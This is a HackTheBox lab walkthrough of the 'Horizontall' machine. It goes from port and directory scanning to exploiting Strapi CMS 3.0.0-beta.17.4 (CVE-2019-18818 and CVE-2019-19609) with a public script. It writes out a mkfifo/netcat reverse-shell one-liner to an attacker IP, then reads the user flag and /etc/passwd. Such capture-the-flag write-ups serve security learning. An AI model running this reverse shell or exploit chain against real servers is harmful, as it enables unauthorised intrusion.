---
title: "HTB Walkthrough: Horizontall"
date: 2022-05-16T22:46:30-04:00 
categories:
  - HackTheBox
header:
  teaser: /assets/images/HTB/horizontall/horizontall.png
tags:
  - Easy
  - Linux Host
---

![Antique Logo](/assets/images/HTB/horizontall/horizontall.png)  

---

## Scanning Port 80 (horizontall.htb)  

Let's go ahead and run our port scanner.    

### NMap Results  

```bash
$ sudo nmap -sS -A -sV -T5 -p- 10.10.11.105 | tee nmap.log

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```  

It appears we are running some outdated version of nginx (1.14.0).  
Additionally, we see that 10.10.11.105 is running a webserver at horizontall.htb, so let's add a line to our /etc/hosts file :  

![Edit /etc/hosts](/assets/images/HTB/horizontall/add-host.png)  

If we don't do this, the webpage will not show up correctly in our browser.  
When we visit it, it seems like a pretty boring, generic pre-made template-style page for these things :  

![Home Page](/assets/images/HTB/horizontall/homepage.png)  

### Fuzz Faster U Fool (FFUF) Results  

Here are the results from my quick, initial directory brute-force scan:  

```bash
$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://horizontall.htb/FUZZ -o ffuf.log

img                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 91ms]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 86ms]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 94ms]
```  

### Dirb Results  

Dirb didn't do much better than FFUF :  

```bash
$dirb http://horizontall.htb /usr/share/seclists/Discovery/Web-Content/common.txt -o dirb.log

---- Scanning URL: http://horizontall.htb/ ----
==> DIRECTORY: http://horizontall.htb/css/                                                                         
+ http://horizontall.htb/favicon.ico (CODE:200|SIZE:4286)                                                          
==> DIRECTORY: http://horizontall.htb/img/                                                                         
+ http://horizontall.htb/index.html (CODE:200|SIZE:901)                                                            
==> DIRECTORY: http://horizontall.htb/js/             
```  

### Web Traffic Analysis via Burpsuite  

I intercepted the webpage with Burpsuite's built-in browser to see some of the web traffic. Actually, it returns quite a few responses. I skimmed through them all (this is less true for horizontall.htb/js/chunk-vendors.0e02b89e.js which returned over a million characters).  

Looking at the response for horizontall.htb/js/app.c68eb462.js, I see a get request made to a sub-domain '**api-prod.horizontall.htb/reviews**' that is supposed to retrieve reviews :  

![API Subdomain Burp](/assets/images/HTB/horizontall/api.png)  

Trying to navigate to this page doesn't work, so we can edit our /etc/hosts line from before to look like this :  

```burp
10.10.11.105	horizontall.htb api-prod.horizontall.htb
```  

Great! Now we can access and scan this subdomain.  

## Scanning Port 80 (api-prod.horizontall.htb)  

Navigating to api-prod.horizontall.htb:80 we get a plain 'Welcome' page.  

If we check out the /reviews directory that we found in Burpsuite, we see a list of all the site's reviews and their data :  

![Reviews JSON](/assets/images/HTB/horizontall/reviews.png)  

### FFUF Results  

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://api-prod.horizontall.htb/FUZZ -recursion -recursion-depth 2 -o ffuf-recursive.log

admin                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 113ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 94ms]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 99ms]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4, Duration: 106ms]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1, Duration: 116ms]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 85ms]
```  

### Nikto Results  

```bash
$ nikto -h "api-prod.horizontall.htb" | tee nikto.log

- Nikto 
---------------------------------------------------------------------------
+ Target IP:          10.10.11.105
+ Target Hostname:    api-prod.horizontall.htb
+ Target Port:        80
+ Start Time:         2022-05-17 23:50:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Retrieved x-powered-by header: Strapi <strapi.io>
+ Retrieved access-control-allow-origin header: *
+ Allowed HTTP Methods: HEAD, GET 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /Admin/: This might be interesting...
+ /admin/index.html: Admin login page/section found.
+ /admin/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /admin/status: Tomcat Server Status interface found (pass protected)
+ /admin/sites/new: ComfortableMexicanSofa CMS Engine Admin Backend (pass protected)
---------------------------------------------------------------------------
```  

These admin/etc directories look great, but Nikto tells us they are password-protected. Also we notice Tomcat was detected - neat. Let's check out /admin.  

## Service Enumeration  

Navigating to api-prod.horizontall.htb/admin, we are redirected to api-prod.horizontall.htb/admin/auth/login, a login portal for Strapi CMS.

### Strapi CMS  
 
Strapi is an open-source developer-oriented Content Management System (CMS), made with JavaScript. On horizontall, it appears that Strapi was used to create, at least, the /reviews API.  

![Strapi Login Page](/assets/images/HTB/horizontall/strapi-login.png)  

I did not find any default credentials for Strapi online, but tried admin:admin anyways, without success.  

Doing a quick search for public exploits we get this :  

```bash
$ searchsploit strapi  
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)              | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)        | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)          | nodejs/webapps/50716.rb
```  

Unauthenticated RCE or Unauth'd Set Password would be great initial footholds, however, I haven't been able to locate the Strapi version running on horizontall.  

Doing a quick Google search for Strapi exploits, I decided to check [this](https://www.exploit-db.com/exploits/50239) one out. Exploits are a great place to look for specific version number enumeration methods, because they often check a service's version before running :  

![Strapi Exploit Get Version](/assets/images/HTB/horizontall/strapi-version.png)  

In the check_version() function, we see a Python3 GET request to /admin/init.  

If I try navigating to api-prod.horizontall.htb/admin/init, I can confirm that this web-app's Strapi version is **3.0.0-beta.17.4**, which we confirmed is vulnerable.  

![My Strapi Version Number](/assets/images/HTB/horizontall/strapi-my-version.png)  

## Exploitation - Strapi CMS  

This version of Strapi is actually vulnerable to **two different CVE's**  
- CVE-2019-18818  
- CVE-2019-19609  

### CVE-2019-18818  

![NIST Description](assets/images/HTB/horizontall/18818.png)  

According to the National Institute of Standards and Technology (NIST):  

This CVE's software weakness is defined as **[CWE-640](http://cwe.mitre.org/data/definitions/640.html): Weak Password Recovery Mechanism for Forgotten Password**  

Which, in Strapi v3.0.0-beta.17.4, allows malicious actors to change the admin account's password without having to provide it. 

There is more information about this vulnerability [here](https://nvd.nist.gov/vuln/detail/CVE-2019-18818).  

### CVE-2019-19609  

![NIST Description](assets/images/HTB/horizontall/19609.png)  

According to the National Institute of Standards and Technology (NIST):  

This CVE's software weakness is defined as **[CWE-78](https://cwe.mitre.org/data/definitions/78.html): Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')**  

Utilizing this exploit, we can remotely execute code on horizontall's operating system (OS).  

There is more information about this vulnerability [here](https://nvd.nist.gov/vuln/detail/CVE-2019-19609).  

### Exploiting Strapi Service  

Well, let's give it a try, shall we?  

I copied the Python code from exploit-db [here](https://www.exploit-db.com/exploits/50239) and pasted it into a local file named strapi-rce.py.  

```
$python3 strapi-rce.py http://api-prod.horizontall.htb

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjUyODQ5NzE5LCJleHAiOjE2NTU0NDE3MTl9.bWiDMGwr-JGwVRnVxGe5f15Xv-3M41kjGrMl9QHq8LM

$>
```  

Sweet, so now we should be able to login to the Strapi admin portal :  

![Strapi Admin Login](/assets/images/HTB/horizontall/strapi-admin.png)  

There are multiple things going on in this portal that we can control, inlcluding a file upload plugin. However, our exploit already gave us RCE on the machine so let's use that to get a shell.  

The exploit that I ran to change admin's password immediately allows RCE afterwards. I tried a couple payloads unsuccessfully and then Google'd '**Strapi OS Injection Payload** which brought up a [blog post](https://bittherapy.net/post/strapi-framework-remote-code-execution/) from a person that claims to have discovered the CVE.  

Here is the payload he/she used to secure a shell :  

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
```  

So I set up a Netcat listener and changed the IP/Port and fired it off in my RCE exploit window :  

```bash
$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 8888 >/tmp/f

$ nc -nvlp 8888                             
listening on [any] 8888 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.105] 47746
/bin/sh: 0: can't access tty; job control turned off

#Spawn a shell:
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ id

uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)

$ locate user.txt

/home/developer/user.txt
$ cd /home/developer/user.txt
/bin/sh: 10: cd: can't cd to /home/developer/user.txt

$ cat /home/developer/user.txt
cat /home/developer/user.txt
86beadcc60ddf508ab48d7ebc3463e50
```  

## Post-Exploitation Enumeration  

Now we need to try to escalate our user (strapi) privileges. Let's start by getting an idea of who/what all is on this system.  

### Standard Enumeration  

```bash
$cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
strapi:x:1001:1001::/opt/strapi:/bin/sh
```  

```bash
$uname -a
Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```  


